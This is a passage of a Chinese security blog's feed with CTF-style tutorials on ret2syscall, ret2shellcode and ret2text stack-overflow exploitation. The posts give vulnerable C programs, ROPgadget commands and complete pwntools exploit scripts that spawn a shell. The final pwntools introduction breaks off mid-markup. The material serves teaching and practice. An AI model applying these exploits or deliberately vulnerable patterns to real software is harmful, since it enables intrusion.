    <link href="/2020/02/25/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall/"/>
    <url>/2020/02/25/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在NX保护机制被打开无法使用ret2shellcode，且代码中没有可利用片段时无法使用ret2text时，仍然有很多方法可以构造恶意代码，这篇文章就介绍另一种方法：ret2syscall</p><h2 id="ret2syscall原理"><a href="#ret2syscall原理" class="headerlink" title="ret2syscall原理"></a>ret2syscall原理</h2><p>ret2syscall，系统呼叫，也叫系统调用，顾名思义，ret2syscall是一种通过系统调用来执行恶意代码的攻击方式。</p><p>在计算机中，系统调用指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。Linux的系统调用通过int 80h实现，用系统调用号来区分入口函数。当进程执行系统调用时，先调用系统调用库中定义某个函数，该函数通常被展开成前面提到的_syscallN的形式通过int 0x80来陷入核心，其参数也将被通过寄存器传往核心。</p><p>系统调用相关的知识就不再赘述，感兴趣的可以去查阅相关资料，下来通过实验来详细说明一下这种攻击方式。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>本题目我们使用ctf-wiki中basicROP-ret2syscall的例子。直接在<a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2syscall%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84%E9%93%BE%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8D%B3%E5%8F%AF%EF%BC%88ctf-wiki%E4%B8%AD%E6%97%A7%E9%93%BE%E6%8E%A5%E9%A2%98%E7%9B%AE%E5%B7%B2%E7%BB%8F%E8%A2%AB%E8%BF%81%E7%A7%BB%E5%88%B0%E5%90%8C%E4%BD%9C%E8%80%85%E5%8F%A6%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AEctf-challenges%E4%B8%AD%EF%BC%89%E3%80%82">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2syscall中提供的链接下载即可（ctf-wiki中旧链接题目已经被迁移到同作者另一个项目ctf-challenges中）。</a></p><p>题目链接：<br><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall</a></p><p>题目源码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp">    <br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">char</span> *shell = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>    <br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This time, no system() and NO SHELLCODE!!!\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you plan to do?\n&quot;</span>);<br>    <span class="hljs-built_in">gets</span>(buf);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>面对不是我们自己编译的程序，首先file命令查看程序，然后将程序放入gdb中，使用checksec查看一下安全机制。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall01.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall02.png"></p><p>分析程序，在15行gets(buf)中很明显有栈溢出，但是本例中，既没有可以执行的恶意代码system(“/bin/sh”)，也有NX保护，无法直接构造执行shellcode。但是具有一个”/bin/sh”字符串，这个字符串看上去一定有问题，却无法直接利用，我们根据前面讲到的系统调用的定义，查阅相关资料，就会有一些思路。</p><p>我们如果想使用系统调用int 0x80来打开一个shell，就需要构造一个如下指令的系统调用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-string">&quot;/bin/sh&quot;</span>,NULL,NULL)</span></span><br></code></pre></td></tr></table></figure><p>由于我们刚才file看到这个程序是32位程序，就需要当eax是int 0xb时，就可以调用系统指令execve。</p><p>这个指令有三个参数，分别是”/bin/sh”,NULL,NULL。</p><p>那我们在执行时就还需要三个额外的寄存器来存储这三个值，分别是ebx、ecx、edx。</p><p>需要的操作有以下四点：</p><ul><li>1.使eax等于int 0xb，触发execve()。</li><li>2.ebx是第一个参数，要赋值为”/bin/sh”</li><li>3.ecx是第二个参数，要赋值为0</li><li>4.ecx是第三个参数，要赋值为0</li></ul><p>所以我们要寻找int 0x80，”/bin/sh”的地址，以及对eax、ebx、ecx、edx四个寄存器赋值的指令地址。</p><h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息，此次需要使用到一个工具ROPgadget。</p><p>1.寻找int 0x80地址</p><p>ROPgadget –binary ret2syscall –only “int”</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall03.png"></p><p>2.寻找”/bin/sh”地址</p><p>ROPgadget –binary ret2syscall –string “/bin/sh”</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall04.png"></p><p>3.寻找对eax赋值的地址</p><p>ROPgadget –binary ret2syscall –only “pop|ret” |grep eax</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall05.png"></p><p>4.寻找对ebx赋值的地址</p><p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ebx</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall06.png"></p><p>5.寻找对ecx赋值的地址</p><p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ecx</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall07.png"></p><p>6.寻找对edx赋值的地址</p><p>ROPgadget –binary ret2syscall –only “pop|ret” |grep edx</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall08.png"></p><p>从ROPgadget的结果可以得到，int 0x80的地址是0x8049421，”/bin/sh”的地址是0x80be408，对eax赋值的地址是0x80bb196，连续对ebx、ecx、edx赋值的地址是0x806eb90。</p><p>此时我们所有需要的信息都得到了，就可以开始构造我们的payload了。</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，要在将返回地址指向int 0x80,在返回之前要将四个寄存器赋值完成，所以最终payload构成是</p><p>payload = padding+pop_eax+”0xb”+pop_edx_ecx_ebx+0+0+”/bin/sh”+int 0x80</p><p>padding是填充的偏移</p><p>payload = “A”*112+p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</p><p>然后写出exp:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">sh</span> = process(&#x27;./ret<span class="hljs-number">2</span>syscall&#x27;)<br><br><span class="hljs-attribute">eax</span> = <span class="hljs-number">0</span>x<span class="hljs-number">080</span>bb<span class="hljs-number">196</span><br><span class="hljs-attribute">edx_ecx_ebx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0806</span>eb<span class="hljs-number">90</span><br><span class="hljs-attribute">int_0x80</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08049421</span><br><span class="hljs-attribute">binsh</span> = <span class="hljs-number">0</span>x<span class="hljs-number">80</span>be<span class="hljs-number">408</span><br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">112</span>+p<span class="hljs-number">32</span>(eax)+p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>xb)+p<span class="hljs-number">32</span>(edx_ecx_ebx)+p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">32</span>(binsh)+p<span class="hljs-number">32</span>(int_<span class="hljs-number">0</span>x<span class="hljs-number">80</span>)<br><span class="hljs-attribute">sh</span>.sendline(payload)<br><span class="hljs-attribute">sh</span>.interactive()<br></code></pre></td></tr></table></figure><p>执行exp即可获取shell</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall09.png"></p><p>当然也可以通过别的方法分别赋值几个寄存器，只要最后让每一个寄存器的值都符合条件，就可以触发。如：</p><p>上面我们打印了grep ecx和edx时得到的</p><p>ecx_ebx = 0x0806eb91</p><p>edx = 0x0806eb6a</p><p>那么payload也可以写成</p><p>payload = “A”*112+p32(eax)+p32(0xb)+p32(ecx_ebx)+p32(0)+p32(binsh)+p32(edx)+p32(0)+p32(int_0x80)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">sh</span> = process(&#x27;./ret<span class="hljs-number">2</span>syscall&#x27;)<br><br><span class="hljs-attribute">eax</span> = <span class="hljs-number">0</span>x<span class="hljs-number">080</span>bb<span class="hljs-number">196</span><br><span class="hljs-attribute">ecx_ebx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0806</span>eb<span class="hljs-number">91</span><br><span class="hljs-attribute">edx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0806</span>eb<span class="hljs-number">6</span>a<br><span class="hljs-attribute">int_0x80</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08049421</span><br><span class="hljs-attribute">binsh</span> = <span class="hljs-number">0</span>x<span class="hljs-number">80</span>be<span class="hljs-number">408</span><br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">112</span>+p<span class="hljs-number">32</span>(eax)+p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>xb)+p<span class="hljs-number">32</span>(ecx_ebx)+p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">32</span>(binsh)+p<span class="hljs-number">32</span>(edx)+p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">32</span>(int_<span class="hljs-number">0</span>x<span class="hljs-number">80</span>)<br><span class="hljs-attribute">sh</span>.sendline(payload)<br><span class="hljs-attribute">sh</span>.interactive()<br></code></pre></td></tr></table></figure><p>执行exp2获取shell</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall10.png"></p>]]></content>
    
    
    <categories>
      
      <category>二进制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出之ret2shellcode</title>
    <link href="/2020/02/24/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2shellcode/"/>
    <url>/2020/02/24/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2shellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇博客讲到的ret2text中，我们利用了程序中已有的sys函数中的恶意代码来进行getshell，而实际情况中很可能没有这种代码，我们就需要自己拼接或构造恶意代码。这篇文章就讲另一种方式，使用填充shellcode的方法构造恶意代码。</p><h2 id="ret2shellcode原理"><a href="#ret2shellcode原理" class="headerlink" title="ret2shellcode原理"></a>ret2shellcode原理</h2><p>ret2shellcode，即控制程序执行shellcode代码，shellcode需要放在一个可执行区域，然后通过返回地址找到这个地方执行填充好的恶意代码，获取shell。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>我们手动码一个带栈溢出问题的程序，这个程序有一个子函数func，func中gets位置存在栈溢出，并且程序有一个全局变量buf。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">128</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">char</span> msg[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">gets</span>(msg);<br><span class="hljs-built_in">strcpy</span>(buf,msg);<br><span class="hljs-built_in">puts</span>(msg);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">func</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>如果要在内存空间中执行代码，我们需要关闭之前linux程序保护机制一文中提到的NX保护机制来构造一个环境。<br>在gcc编译过程中加入-z execstack参数使其关闭NX保护机制，并打开-g调试选项，使用如下方式进行编译。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> -g -fno-stack-protector -no-pie -z execstack -o ret<span class="hljs-number">2</span>shellcode<span class="hljs-number">64</span> ret<span class="hljs-number">2</span>shellcode.c<br></code></pre></td></tr></table></figure><h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>首先我们将程序gdb中，使用checksec查看一下安全机制（养成习惯）</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2shellcode01.png"></p><p>分析程序，由于gets(msg)位置很明显有栈溢出，所以就是需要找一个目标地址来执行恶意代码获取shell，但是本题目中没有另一个子函数，却有一个全局变量buf，msg的内容会被拷贝到buf中，根据ret2shellcode的原理，我们能放下很长一段shellcode的地址也只有这个buf了，所以需要想办法构造溢出填充返回地址指向全局变量buf，且strcpy过程填充buf为shellcode。</p><p>所以我们需要的信息有以下几点：<br>1.全局变量buf的地址<br>2.局部变量msg的地址<br>3.func函数的返回地址</p><h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息</p><p>1.在第char msg[]处下个断点调试，运行程序到func内,并打印全局变量buf、局部变量msg，的地址和此时rbp的地址。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2shellcode02.png"></p><p>2.使用vmmap查看全局变量buf所在位置是否具有可写权限。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2shellcode03.png"></p><p>此时找到局部变量msg的地址是0xffe210，rbp的地址是0xffe280，全局变量buf的地址是0x404060，那么64位程序func返回地址就是0xffe288，且从vmmap结果可以得到全局变量中具有可执行权限。</p><p>此时我们所有需要的信息都得到了，就可以开始构造我们的payload了。</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，我们要填充局部变量msg，这部分填充会被拷贝到buf中，所以要先填充shellcode，然后再填充一部分字符，使其使其占用空间直到返回地址，然后再将后面八个字节的位置填充为全局变量buf的地址0x404060，就可以使程序跳转到我们构造好的恶意代码处执行。</p><p>加上shellcode的总偏移长度是返回地址减去局部变量地址，得到0x78=120</p><p>这个总偏移长度要被shellcode和填充占满，后面的填充好说，前面的shellcode需要我们通过二进制数据模拟一个shell出来，这对于初学者来说稍微有些困难，我们可以通过编译好一个system(“/bin/sh”)程序来获取，也可以网上查找，最方便的办法还是用之前介绍过的pwntoolsshellcode模块直接生成。</p><p>shellcode = asm(shellcraft.amd64.linux.sh())<br>payload = shellcode.ljust(120, ‘A’)+p64(0x404060)</p><p>然后写出exp:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./ret2shellcode64&quot;</span>)<br><span class="hljs-attribute">shellcode</span> = asm(shellcraft.amd<span class="hljs-number">64</span>.linux.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br><span class="hljs-attribute">payload</span> = shellcode.ljust(<span class="hljs-number">120</span>, &#x27;A&#x27;)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">404060</span>)<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive<br></code></pre></td></tr></table></figure><p>执行exp即可获取shell</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2shellcode04.png"></p>]]></content>
    
    
    <categories>
      
      <category>二进制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出之ret2text</title>
    <link href="/2020/02/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2text/"/>
    <url>/2020/02/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2text/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前栈溢出漏洞主要的利用方式是ROP(Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到我们想要执行恶意代码的位置中。而跳转的目标有可能是一段本就已经写好的可以执行恶意命令的函数，也有可能是某个全局变量空间，甚至构造一个系统调用的cpu指令，跳转到一个libc中的函数等。最终目的都是执行恶意命令，而未来几篇文章分别介绍采取上述不同的方法完成不同场景的ROP。</p><h2 id="ret2text原理"><a href="#ret2text原理" class="headerlink" title="ret2text原理"></a>ret2text原理</h2><p>先从ROP中最易于理解的ret2text讲起，ret2text顾名思义，即控制返回地址指向程序本身已有的的代码(.text)并执行。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>我们手动码一个带栈溢出问题的程序，这个程序有两个子函数func和sys，func中gets位置存在栈溢出，而sys函数未被任何函数调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//ret2text.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sys</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/shn&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">char</span> a[<span class="hljs-number">10</span>];<br><span class="hljs-built_in">gets</span>(a);<br><span class="hljs-built_in">puts</span>(a);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">func</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>为了方便学习分析，这次先不加入canary机制和地址随机化问题的干扰，这些机制的绕过方式放在后面统一归纳总结。所以在gcc编译过程中加入参数使其关闭这两个保护机制，并打开-g调试选项，使用如下方式进行编译。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> -g -fno-stack-protector -no-pie -o ret<span class="hljs-number">2</span>text<span class="hljs-number">64</span> ret<span class="hljs-number">2</span>text.c<br></code></pre></td></tr></table></figure><h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>首先我们将程序gdb中，使用checksec查看一下安全机制（虽然这个题目的安全机制我们已经提前知道）</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2text01.png"></p><p>我们分析一下这个程序，从ret2text的原理来看，我们需要覆盖通过func函数中的局部变量a的溢出，覆盖func函数的返回地址，将其引导到sys函数的地址就可以获取shell。</p><p>所以我们需要的信息有以下几点：<br>1.局部变量a的地址<br>2.func函数的返回地址<br>3.sys函数的地址</p><h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息<br>1.先查看代码，在第6行下个断点调试。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2text02.png"></p><p>2.运行程序到func内，并打印局部变量a的地址，sys函数的地址，以及此时rbp的地址。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2text03.png"></p><p>此时找到变量a的地址是0xffe2b6，rbp的地址是0xffe2c0，sys函数的地址是0x401142。</p><p>我们需要的三个信息已经得到两个，最后剩下的func函数返回地址，在64位程序中，在rbp之后8个字节，所以返回地址是rbp+8=0xffe2c8。</p><p>此时我们所有需要的信息都得到了，就可以开始构造我们的payload了。</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，我们要填充局部变量a直到返回地址，然后再将后面八个字节的位置填充为sys函数的地址0x401142。</p><p>而这个偏移长度就是返回地址减去局部变量地址，得到0x12=18</p><p>所以payload可以通过pwntools构造为</p><p>payload = “A”*18+p64(0x401142)</p><p>然后写出exp:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./ret2text64&quot;</span>)<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">18</span> + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">401142</span>)<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive<br></code></pre></td></tr></table></figure><p>执行exp即可获取shell</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2text04.png"></p>]]></content>
    
    
    <categories>
      
      <category>二进制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwntools工具介绍</title>
    <link href="/2020/02/21/pwntools%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"/>
    <url>/2020/02/21/pwntools%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习二进制的过程中不仅仅是知识体系复杂，除了各种基础知识，漏洞利用技巧，保护机制绕过技巧之外，利用时的payload构造也十分麻烦，手工构造payload需要我们一个字节一个字节的去完成，十分耗费精力，所以需要一个好的工具来辅助我们完成。</p><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>Pwntools是一个CTF框架和漏洞利用开发库。它是用Python编写的，旨在用于快速原型开发和开发，旨在使漏洞利用程序编写尽可能简单。</p><p>看到了吗，他是一个python库，所以我们不费吹灰之力就可以安装好它</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> pwntools<br></code></pre></td></tr></table></figure><p>如果通过此方式安装失败，也可以直接使用github下载源码安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#安装capstone</span><br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/aquynh/</span>capstone<br>cd capstone<br>make<br>make install<br><span class="hljs-comment">#安装pwntools</span><br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Gallopsled/</span>pwntools<br>cd pwntools<br>python setup.py install<br></code></pre></td></tr></table></figure><p>网络上有很多pwntools模块功能介绍的教程，都写得很全面，我就只拿出其中最常用的一些模块介绍，后面用到其他模块时再慢慢补充。</p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">本地 ：<span class="hljs-keyword">sh</span> = porcess(<span class="hljs-string">&quot;./level0&quot;</span>)<br>远程：<span class="hljs-keyword">sh</span> = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,12345)<br>关闭连接：<span class="hljs-keyword">sh</span>.<span class="hljs-keyword">close</span>()  <br></code></pre></td></tr></table></figure><h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sh</span>.send(data)  发送数据<br><span class="hljs-keyword">sh</span>.sendline(data)  发送一行数据，相当于在数据后面加\<span class="hljs-keyword">n</span><br><span class="hljs-keyword">sh</span>.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时<br><span class="hljs-keyword">sh</span>.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\<span class="hljs-keyword">n</span><br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&quot;Hello,World\n&quot;</span>,<span class="hljs-keyword">drop</span>=fasle)  接受数据直到我们设置的标志出现<br><span class="hljs-keyword">sh</span>.recvall()  一直接收直到EOF<br><span class="hljs-keyword">sh</span>.recvrepeat(timeout = default)  持续接受直到EOF或timeout<br><span class="hljs-keyword">sh</span>.interactive()  直接进行交互，相当于回到<span class="hljs-keyword">shell</span>的模式，在取得<span class="hljs-keyword">shell</span>之后使用<br></code></pre></td></tr></table></figure><p>此模块中最常用的就是sh.sendline()函数和sh.interactive()函数，用于发送payload和获取shell后交互</p><h2 id="汇编和反汇编"><a href="#汇编和反汇编" class="headerlink" title="汇编和反汇编"></a>汇编和反汇编</h2><p>汇编</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt;&gt;&gt; <span class="hljs-keyword">asm</span>(<span class="hljs-string">&#x27;nop&#x27;</span>)<br><span 